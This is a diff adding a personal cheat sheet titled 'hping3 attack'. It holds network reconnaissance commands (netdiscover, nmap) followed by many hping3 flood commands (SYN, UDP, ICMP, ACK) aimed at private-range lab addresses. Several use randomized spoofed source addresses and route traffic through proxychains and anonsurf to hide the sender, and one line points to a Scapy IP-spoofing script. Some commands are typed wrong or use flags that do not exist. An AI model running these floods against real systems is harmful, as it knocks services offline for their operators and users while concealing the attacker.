@@ -1,0 +1,106 @@
+hping3 attack
+
+!!!!!!!!!!!!!!!!!!!!!!!
+
+
+tips : https://copilot.microsoft.com/chats/87zmPpYFAPYeafWFKdkaR
+
+
+
+anonsurf          >>   anonsurf -myip         anonsurf start or anonsurf stop
+
+
+
+proxychains hping3 -S --flood --rand-source -p 80 192.168.88.142
+
+proxychains hping3 --udp --flood --rand-source -p 80 192.168.88.142
+
+
+
+scapt_spoof_packet.py  >> ip spoofing   
+
+https://scapy.readthedocs.io/en/latest/installation.html
+
+https://scapy.readthedocs.io/en/latest/usage.html
+
+
+
+
+result finder :
+
+
+https://www.dnsleaktest.com/
+
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    @@@@@@@@@@@@@@@@@@@@@@@@@@@@ """""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+
+
+info-gather
+============
+
+
+ip a
+
+netdiscover -i eth0 
+
+or
+
+netdiscover -i wlan0
+
+
+=========================================================================
+
+
+namp -T4 -p 80 192.168.88.142
+
+namp -T4 -p 53 192.168.88.142    >> port open or close findout
+
+
+
+
+=========================================================================
+
+sudo hping3 -1 -c  192.168.88.142  >> sent lot of packets
+
+sudo hping3 -1 -c 3  192.168.88.142     >> 1 means icmp packets  & c   >> counts sends  3  packets of target ip        >>  wireshark
+
+sudo hping3 -1 -c 3 -i 2 192.168.88.142     >> i >> 2 sec send packets
+ 
+ 
+sudo hping3 -1 -c 3 --fast 192.168.88.142     >> i >> 2 sec send packets
+
+
+hping3 --icmp --flood 192.168.44.142     >> flood means max request sent packets                   >>  wireshark
+
+
+
+hping3 --icmp -a 192.168.88.1 192.168.44.142    customized ip source
+
+
+hping3 --icmp --rand-source 192.168.44.142   >> every  packets send random ips
+
+
+hping3 --icmp --rand-source --flood 192.168.44.142   >> fast  every  packets send random ips
+
+
+hping3 -S --flood -p 80  192.168.44.142
+
+
+
+
+
+
+
+hping3 -A --flood -V -p 80 192.168.44.142
+
+
+
+hping3 --tcp --flood -p 53 192.168.44.142         
+
+
+hping3 --udp --flood -p 53 192.168.44.142         
+
+
+hping3 --icmp --flood -p 53 192.168.44.142          
+
+hping3 --http --flood -p 53 192.168.44.142          
